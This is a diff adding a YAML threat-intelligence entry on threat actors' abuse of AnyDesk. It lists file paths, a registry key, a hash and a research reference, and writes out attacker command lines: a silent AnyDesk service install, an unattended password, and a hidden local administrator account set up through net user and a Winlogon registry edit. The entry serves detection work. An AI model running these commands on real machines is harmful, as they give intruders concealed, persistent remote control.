@@ -1,0 +1,37 @@
+description: Threat actors use AnyDesk for remote access, persistence and data exfiltration.
+TTPs:
+  processes:
+  - cmd.exe
+  - C:\\ProgramData\\AnyDesk.exe
+  commandline:
+  - '''cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\Program\AnyDesk --start-with-win
+    --silent'''
+  - '''cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password'''
+  - '''net user oldadministrator "jsbehsid#Zyw4E3" /add'''
+  - '''net localgroup Administrators oldadministrator /ADD'''
+  - '''reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"
+    /v oldadministrator /t REG_DWORD /d 0 /f'''
+  - '''cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id'''
+  powershell: []
+  scripting_engine: []
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist
+  image_load: []
+  network_connections: []
+  file_activity:
+  - '''C:\ProgramData\AnyDesk.exe'''
+  - '''C:\Program Files (x86)\AnyDesk\Portable'''
+  - '''C:\Users\Username\AppData\Roaming\AnyDesk\Cache- Global_cache- Thumbnails'''
+  - '''C:\Users\Username\Videos\AnyDesk'''
+  - '''C:\Users\Username\Pictures\AnyDesk'''
+  persistence:
+  - Installed AnyDesk as a service for unattended access
+  - Created new local administrator account hidden from login screen
+  process_relations: []
+IOCs:
+- 8941b379f03505960bfba86d51b033e4f12eac4a
+authors:
+- Lauren Eynon
+reference: https://www.nccgroup.com/research-blog/the-dark-side-how-threat-actors-leverage-anydesk-for-malicious-activities/
+date_of_publication: June 11, 2024
+file_creation_date: August 22, 2025
